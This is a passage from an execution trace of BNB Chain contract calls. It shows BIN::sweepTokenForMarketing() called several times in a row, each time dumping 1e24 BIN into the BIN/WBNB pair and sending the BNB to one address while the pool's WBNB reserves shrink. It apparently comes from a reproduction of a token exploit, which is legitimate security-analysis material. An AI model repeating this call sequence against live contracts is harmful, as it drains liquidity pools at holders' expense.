    │   │   │   ├─ [534] WBNB::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 60265517366891315186 [6.026e19]
    │   │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 34652882184550549714540985 [3.465e25]
    │   │   │   ├─ emit Sync(reserve0: 60265517366891315186 [6.026e19], reserve1: 34652882184550549714540985 [3.465e25])
    │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 1000000000000000000000000 [1e24], amount0Out: 1786321101527279168 [1.786e18], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
    │   │   │   └─ ← [Return] 1786321101527279168 [1.786e18]
    │   │   ├─ [9223] WBNB::withdraw(1786321101527279168 [1.786e18])
    │   │   │   ├─ [83] Router::fallback{value: 1786321101527279168}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 1786321101527279168 [1.786e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [0] 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453::fallback{value: 1786321101527279168}()
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [532] BIN::balanceOf(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]) [staticcall]
    │   └─ ← [Return] 7048305953898063254994587 [7.048e24]
    ├─ [76101] BIN::sweepTokenForMarketing()
    │   ├─ [275] Router::WETH() [staticcall]
    │   │   └─ ← [Return] WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]
    │   ├─ [70248] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9])
    │   │   ├─ [6623] BIN::transferFrom(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Transfer(from: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], to: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, value: 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Approval(owner: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640202639085175116878584641522 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [893] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 60265517366891315186 [6.026e19], 34652882184550549714540985 [3.465e25], 1710126485 [1.71e9]
    │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   └─ ← [Return] 35652882184550549714540985 [3.565e25]
    │   │   ├─ [38256] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::swap(1686233074929711720 [1.686e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
    │   │   │   ├─ [23162] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1686233074929711720 [1.686e18])
    │   │   │   │   ├─ emit Transfer(from: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 1686233074929711720 [1.686e18])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [534] WBNB::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 58579284291961603466 [5.857e19]
    │   │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 35652882184550549714540985 [3.565e25]
    │   │   │   ├─ emit Sync(reserve0: 58579284291961603466 [5.857e19], reserve1: 35652882184550549714540985 [3.565e25])
    │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 1000000000000000000000000 [1e24], amount0Out: 1686233074929711720 [1.686e18], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
    │   │   │   └─ ← [Return] 1686233074929711720 [1.686e18]
    │   │   ├─ [9223] WBNB::withdraw(1686233074929711720 [1.686e18])
    │   │   │   ├─ [83] Router::fallback{value: 1686233074929711720}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 1686233074929711720 [1.686e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [0] 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453::fallback{value: 1686233074929711720}()
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [532] BIN::balanceOf(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]) [staticcall]
    │   └─ ← [Return] 6048305953898063254994587 [6.048e24]
    ├─ [76101] BIN::sweepTokenForMarketing()
    │   ├─ [275] Router::WETH() [staticcall]
    │   │   └─ ← [Return] WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]
    │   ├─ [70248] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9])
    │   │   ├─ [6623] BIN::transferFrom(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Transfer(from: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], to: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, value: 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Approval(owner: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640201639085175116878584641522 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [893] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 58579284291961603466 [5.857e19], 35652882184550549714540985 [3.565e25], 1710126485 [1.71e9]
    │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   └─ ← [Return] 36652882184550549714540985 [3.665e25]
    │   │   ├─ [38256] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::swap(1594330880016395439 [1.594e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
    │   │   │   ├─ [23162] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1594330880016395439 [1.594e18])
    │   │   │   │   ├─ emit Transfer(from: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 1594330880016395439 [1.594e18])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [534] WBNB::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 56984953411945208027 [5.698e19]
    │   │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 36652882184550549714540985 [3.665e25]
    │   │   │   ├─ emit Sync(reserve0: 56984953411945208027 [5.698e19], reserve1: 36652882184550549714540985 [3.665e25])
    │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 1000000000000000000000000 [1e24], amount0Out: 1594330880016395439 [1.594e18], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
    │   │   │   └─ ← [Return] 1594330880016395439 [1.594e18]
    │   │   ├─ [9223] WBNB::withdraw(1594330880016395439 [1.594e18])
    │   │   │   ├─ [83] Router::fallback{value: 1594330880016395439}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 1594330880016395439 [1.594e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [0] 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453::fallback{value: 1594330880016395439}()
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [532] BIN::balanceOf(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]) [staticcall]
    │   └─ ← [Return] 5048305953898063254994587 [5.048e24]
    ├─ [76101] BIN::sweepTokenForMarketing()
    │   ├─ [275] Router::WETH() [staticcall]
    │   │   └─ ← [Return] WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]
    │   ├─ [70248] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9])
    │   │   ├─ [6623] BIN::transferFrom(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Transfer(from: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], to: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, value: 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Approval(owner: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640200639085175116878584641522 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [893] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 56984953411945208027 [5.698e19], 36652882184550549714540985 [3.665e25], 1710126485 [1.71e9]
    │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   └─ ← [Return] 37652882184550549714540985 [3.765e25]
    │   │   ├─ [38256] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::swap(1509745392484756274 [1.509e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
    │   │   │   ├─ [23162] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1509745392484756274 [1.509e18])
    │   │   │   │   ├─ emit Transfer(from: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 1509745392484756274 [1.509e18])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [534] WBNB::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 55475208019460451753 [5.547e19]
    │   │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 37652882184550549714540985 [3.765e25]
    │   │   │   ├─ emit Sync(reserve0: 55475208019460451753 [5.547e19], reserve1: 37652882184550549714540985 [3.765e25])
    │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 1000000000000000000000000 [1e24], amount0Out: 1509745392484756274 [1.509e18], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
    │   │   │   └─ ← [Return] 1509745392484756274 [1.509e18]
    │   │   ├─ [9223] WBNB::withdraw(1509745392484756274 [1.509e18])
    │   │   │   ├─ [83] Router::fallback{value: 1509745392484756274}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 1509745392484756274 [1.509e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [0] 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453::fallback{value: 1509745392484756274}()
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [532] BIN::balanceOf(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]) [staticcall]
    │   └─ ← [Return] 4048305953898063254994587 [4.048e24]
    ├─ [76101] BIN::sweepTokenForMarketing()
    │   ├─ [275] Router::WETH() [staticcall]
    │   │   └─ ← [Return] WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]
    │   ├─ [70248] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9])
    │   │   ├─ [6623] BIN::transferFrom(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Transfer(from: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], to: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, value: 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Approval(owner: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640199639085175116878584641522 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [893] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 55475208019460451753 [5.547e19], 37652882184550549714540985 [3.765e25], 1710126485 [1.71e9]
    │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   └─ ← [Return] 38652882184550549714540985 [3.865e25]
    │   │   ├─ [38256] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::swap(1431719865930099017 [1.431e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
    │   │   │   ├─ [23162] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1431719865930099017 [1.431e18])
    │   │   │   │   ├─ emit Transfer(from: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 1431719865930099017 [1.431e18])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [534] WBNB::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 54043488153530352736 [5.404e19]
    │   │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 38652882184550549714540985 [3.865e25]
    │   │   │   ├─ emit Sync(reserve0: 54043488153530352736 [5.404e19], reserve1: 38652882184550549714540985 [3.865e25])
    │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 1000000000000000000000000 [1e24], amount0Out: 1431719865930099017 [1.431e18], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
    │   │   │   └─ ← [Return] 1431719865930099017 [1.431e18]
    │   │   ├─ [9223] WBNB::withdraw(1431719865930099017 [1.431e18])
    │   │   │   ├─ [83] Router::fallback{value: 1431719865930099017}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 1431719865930099017 [1.431e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [0] 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453::fallback{value: 1431719865930099017}()
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [532] BIN::balanceOf(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]) [staticcall]
    │   └─ ← [Return] 3048305953898063254994587 [3.048e24]
    ├─ [76101] BIN::sweepTokenForMarketing()
    │   ├─ [275] Router::WETH() [staticcall]
    │   │   └─ ← [Return] WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]
    │   ├─ [70248] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9])
    │   │   ├─ [6623] BIN::transferFrom(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Transfer(from: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], to: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, value: 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Approval(owner: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640198639085175116878584641522 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [893] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 54043488153530352736 [5.404e19], 38652882184550549714540985 [3.865e25], 1710126485 [1.71e9]
    │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   └─ ← [Return] 39652882184550549714540985 [3.965e25]
    │   │   ├─ [38256] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::swap(1359592933612415223 [1.359e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
    │   │   │   ├─ [23162] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1359592933612415223 [1.359e18])
    │   │   │   │   ├─ emit Transfer(from: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 1359592933612415223 [1.359e18])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [534] WBNB::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 52683895219917937513 [5.268e19]
    │   │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 39652882184550549714540985 [3.965e25]
    │   │   │   ├─ emit Sync(reserve0: 52683895219917937513 [5.268e19], reserve1: 39652882184550549714540985 [3.965e25])
    │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 1000000000000000000000000 [1e24], amount0Out: 1359592933612415223 [1.359e18], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
    │   │   │   └─ ← [Return] 1359592933612415223 [1.359e18]
    │   │   ├─ [9223] WBNB::withdraw(1359592933612415223 [1.359e18])
    │   │   │   ├─ [83] Router::fallback{value: 1359592933612415223}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 1359592933612415223 [1.359e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [0] 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453::fallback{value: 1359592933612415223}()
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [532] BIN::balanceOf(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]) [staticcall]
    │   └─ ← [Return] 2048305953898063254994587 [2.048e24]
    ├─ [76101] BIN::sweepTokenForMarketing()
    │   ├─ [275] Router::WETH() [staticcall]
    │   │   └─ ← [Return] WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]
    │   ├─ [70248] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9])
    │   │   ├─ [6623] BIN::transferFrom(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Transfer(from: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], to: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, value: 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Approval(owner: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640197639085175116878584641522 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [893] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 52683895219917937513 [5.268e19], 39652882184550549714540985 [3.965e25], 1710126485 [1.71e9]
    │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   └─ ← [Return] 40652882184550549714540985 [4.065e25]
    │   │   ├─ [38256] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::swap(1292784536275305994 [1.292e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
    │   │   │   ├─ [23162] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1292784536275305994 [1.292e18])
    │   │   │   │   ├─ emit Transfer(from: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 1292784536275305994 [1.292e18])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [534] WBNB::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 51391110683642631519 [5.139e19]
    │   │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 40652882184550549714540985 [4.065e25]
    │   │   │   ├─ emit Sync(reserve0: 51391110683642631519 [5.139e19], reserve1: 40652882184550549714540985 [4.065e25])
    │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 1000000000000000000000000 [1e24], amount0Out: 1292784536275305994 [1.292e18], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
    │   │   │   └─ ← [Return] 1292784536275305994 [1.292e18]
    │   │   ├─ [9223] WBNB::withdraw(1292784536275305994 [1.292e18])
    │   │   │   ├─ [83] Router::fallback{value: 1292784536275305994}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 1292784536275305994 [1.292e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [0] 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453::fallback{value: 1292784536275305994}()
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [532] BIN::balanceOf(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]) [staticcall]
    │   └─ ← [Return] 1048305953898063254994587 [1.048e24]
    ├─ [76101] BIN::sweepTokenForMarketing()
    │   ├─ [275] Router::WETH() [staticcall]
    │   │   └─ ← [Return] WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]
    │   ├─ [70248] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9])
    │   │   ├─ [6623] BIN::transferFrom(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Transfer(from: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], to: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, value: 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Approval(owner: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640196639085175116878584641522 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [893] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 51391110683642631519 [5.139e19], 40652882184550549714540985 [4.065e25], 1710126485 [1.71e9]
    │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   └─ ← [Return] 41652882184550549714540985 [4.165e25]
    │   │   ├─ [38256] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::swap(1230784214170991796 [1.23e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
    │   │   │   ├─ [23162] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1230784214170991796 [1.23e18])
    │   │   │   │   ├─ emit Transfer(from: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 1230784214170991796 [1.23e18])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [534] WBNB::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 50160326469471639723 [5.016e19]
    │   │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 41652882184550549714540985 [4.165e25]
    │   │   │   ├─ emit Sync(reserve0: 50160326469471639723 [5.016e19], reserve1: 41652882184550549714540985 [4.165e25])
    │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 1000000000000000000000000 [1e24], amount0Out: 1230784214170991796 [1.23e18], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
    │   │   │   └─ ← [Return] 1230784214170991796 [1.23e18]
    │   │   ├─ [9223] WBNB::withdraw(1230784214170991796 [1.23e18])
    │   │   │   ├─ [83] Router::fallback{value: 1230784214170991796}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 1230784214170991796 [1.23e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [0] 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453::fallback{value: 1230784214170991796}()
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [532] BIN::balanceOf(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]) [staticcall]
